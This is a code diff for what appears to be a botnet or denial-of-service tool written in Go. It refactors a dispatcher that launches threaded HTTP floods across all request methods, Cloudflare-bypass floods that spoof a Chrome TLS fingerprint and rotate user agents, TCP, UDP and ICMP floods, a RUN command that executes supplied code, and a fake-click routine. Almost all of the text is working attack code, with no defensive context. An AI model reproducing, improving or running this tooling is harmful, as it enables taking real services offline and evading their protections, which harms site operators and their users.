@@ -112,37 +112,77 @@ type AttackManager struct {
 }
 
 func Role(Attack AttackManager) {
-	var wg sync.WaitGroup
 	for _, value := range Attack.Managers {
-		switch value.Method {
-		case "GET":
-			wg.Add(1)
-			go GET(value.Host, value.B.Code, value.Headers, value.Thread, &wg)
-		case "POST":
-			wg.Add(1)
-			go POST(value.Host, value.B.Code, value.Headers, value.Thread, &wg)
-		case "CF-GET":
-			wg.Add(1)
-			go CF_GET(value.Host, value.B.Code, value.Headers, value.Thread, &wg)
-		case "CF-POST":
-			wg.Add(1)
-			go CF_POST(value.Host, value.B.Code, value.Headers, value.Thread, &wg)
-		case "TCP":
-			wg.Add(1)
-			go TCP(value.Host, value.B.Code, value.Thread, &wg)
-		case "UDP":
-			wg.Add(1)
-			go UDP(value.Host, value.Thread, &wg)
-		case "ICMP":
-			wg.Add(1)
-			go ICMP(value.Host, value.B.Code, value.Thread, &wg)
-		case "RUN":
-			wg.Add(1)
-			RUN(value.B.Code)
-		case "CLICK":
-			wg.Add(1)
-			go Clicker(value.Host, value.Headers, value.Thread, &wg)
-		}
+		SelectMethod(value)
+	}
+}
+
+func SelectMethod(value *Attack) {
+	var wg sync.WaitGroup
+	switch value.Method {
+	case "CF-GET":
+		wg.Add(1)
+		go CF_BYP(value.Host, value.B.Code, "GET", value.Headers, value.Thread, &wg)
+	case "CF-POST":
+		wg.Add(1)
+		go CF_BYP(value.Host, value.B.Code, "POST", value.Headers, value.Thread, &wg)
+	case "CF-PUT":
+		wg.Add(1)
+		go CF_BYP(value.Host, value.B.Code, "PUT", value.Headers, value.Thread, &wg)
+	case "CF-DELETE":
+		wg.Add(1)
+		go CF_BYP(value.Host, value.B.Code, "DELETE", value.Headers, value.Thread, &wg)
+	case "CF-PATCH":
+		wg.Add(1)
+		go CF_BYP(value.Host, value.B.Code, "PATCH", value.Headers, value.Thread, &wg)
+	case "CF-HEAD":
+		wg.Add(1)
+		go CF_BYP(value.Host, value.B.Code, "HEAD", value.Headers, value.Thread, &wg)
+	case "CF-OPTIONS":
+		wg.Add(1)
+		go CF_BYP(value.Host, value.B.Code, "OPTIONS", value.Headers, value.Thread, &wg)
+	case "CF-TRACE":
+		wg.Add(1)
+		go CF_BYP(value.Host, value.B.Code, "TRACE", value.Headers, value.Thread, &wg)
+	case "GET":
+		wg.Add(1)
+		go REQ(value.Host, value.B.Code, "GET", value.Headers, value.Thread, &wg)
+	case "POST":
+		wg.Add(1)
+		go REQ(value.Host, value.B.Code, "POST", value.Headers, value.Thread, &wg)
+	case "PUT":
+		wg.Add(1)
+		go REQ(value.Host, value.B.Code, "PUT", value.Headers, value.Thread, &wg)
+	case "DELETE":
+		wg.Add(1)
+		go REQ(value.Host, value.B.Code, "DELETE", value.Headers, value.Thread, &wg)
+	case "PATCH":
+		wg.Add(1)
+		go REQ(value.Host, value.B.Code, "PATCH", value.Headers, value.Thread, &wg)
+	case "HEAD":
+		wg.Add(1)
+		go REQ(value.Host, value.B.Code, "HEAD", value.Headers, value.Thread, &wg)
+	case "OPTIONS":
+		wg.Add(1)
+		go REQ(value.Host, value.B.Code, "OPTIONS", value.Headers, value.Thread, &wg)
+	case "TRACE":
+		wg.Add(1)
+		go REQ(value.Host, value.B.Code, "TRACE", value.Headers, value.Thread, &wg)
+	case "TCP":
+		wg.Add(1)
+		go TCP(value.Host, value.B.Code, value.Thread, &wg)
+	case "UDP":
+		wg.Add(1)
+		go UDP(value.Host, value.Thread, &wg)
+	case "ICMP":
+		wg.Add(1)
+		go ICMP(value.Host, value.B.Code, value.Thread, &wg)
+	case "RUN":
+		wg.Add(1)
+		RUN(value.B.Code)
+	case "CLICK":
+		wg.Add(1)
+		go Clicker(value.Host, value.Headers, value.Thread, &wg)
 	}
 	wg.Wait()
 }
@@ -257,7 +297,7 @@ func TCP(Host, Code string, Thread int, wgs *sync.WaitGroup) {
 	wg.Wait()
 }
 
-func GET(Host, Body string, Headers []string, Thread int, wgs *sync.WaitGroup) {
+func REQ(Host, Body, method string, Headers []string, Thread int, wgs *sync.WaitGroup) {
 	defer wgs.Done()
 	var wg sync.WaitGroup
 	for i := 0; i <= Thread; i++ {
@@ -265,7 +305,7 @@ func GET(Host, Body string, Headers []string, Thread int, wgs *sync.WaitGroup) {
 		go func() {
 			defer wg.Done()
 			client := http.Client{}
-			req, err := http.NewRequest(http.MethodGet, Host, strings.NewReader(Body))
+			req, err := http.NewRequest(method, Host, strings.NewReader(Body))
 			if err != nil {
 				fmt.Println(err)
 				return
@@ -284,7 +324,7 @@ func GET(Host, Body string, Headers []string, Thread int, wgs *sync.WaitGroup) {
 	wg.Wait()
 }
 
-func CF_GET(Host, Body string, Headers []string, Thread int, wgs *sync.WaitGroup) {
+func CF_BYP(Host, Body, method string, Headers []string, Thread int, wgs *sync.WaitGroup) {
 	defer wgs.Done()
 	var wg sync.WaitGroup
 	for i := 0; i <= Thread; i++ {
@@ -304,73 +344,7 @@ func CF_GET(Host, Body string, Headers []string, Thread int, wgs *sync.WaitGroup
 				fmt.Println(err)
 				return
 			}
-			req, err := httpf.NewRequest(http.MethodGet, Host, strings.NewReader(Body))
-			if err != nil {
-				fmt.Println(err)
-				return
-			}
-			for _, r := range Headers {
-				s := strings.Split(r, ":")
-				if len(s) != 2 {
-					break
-				}
-				req.Header.Set(s[0], s[1])
-			}
-			req.Header.Set("User-Agent", user_agent[rand.Intn(len(user_agent))])
-			client.Do(req)
-		}()
-	}
-	wg.Wait()
-}
-
-func POST(Host, Body string, Headers []string, Thread int, wgs *sync.WaitGroup) {
-	defer wgs.Done()
-	var wg sync.WaitGroup
-	for i := 0; i <= Thread; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			client := http.Client{}
-			req, err := http.NewRequest(http.MethodPost, Host, strings.NewReader(Body))
-			if err != nil {
-				fmt.Println(err)
-				return
-			}
-			for _, r := range Headers {
-				s := strings.Split(r, ":")
-				if len(s) != 2 {
-					break
-				}
-				req.Header.Set(s[0], s[1])
-			}
-			req.Header.Set("User-Agent", user_agent[rand.Intn(len(user_agent))])
-			client.Do(req)
-		}()
-	}
-	wg.Wait()
-}
-
-func CF_POST(Host, Body string, Headers []string, Thread int, wgs *sync.WaitGroup) {
-	defer wgs.Done()
-	var wg sync.WaitGroup
-	for i := 0; i <= Thread; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			jar := tls_client.NewCookieJar()
-			options := []tls_client.HttpClientOption{
-				tls_client.WithTimeoutSeconds(30),
-				tls_client.WithClientProfile(profiles.Chrome_105),
-				tls_client.WithNotFollowRedirects(),
-				tls_client.WithCookieJar(jar),
-			}
-
-			client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
-			if err != nil {
-				fmt.Println(err)
-				return
-			}
-			req, err := httpf.NewRequest(http.MethodPost, Host, strings.NewReader(Body))
+			req, err := httpf.NewRequest(method, Host, strings.NewReader(Body))
 			if err != nil {
 				fmt.Println(err)
 				return
@@ -538,6 +512,9 @@ func Gmorning(c echo.Context) error {
 	if err != nil {
 		return err
 	}
+
+	c.Request().Header.Del("X-Password")
+	c.Request().Header.Del("X-Host")
 
 	proxy := httputil.NewSingleHostReverseProxy(target)
 
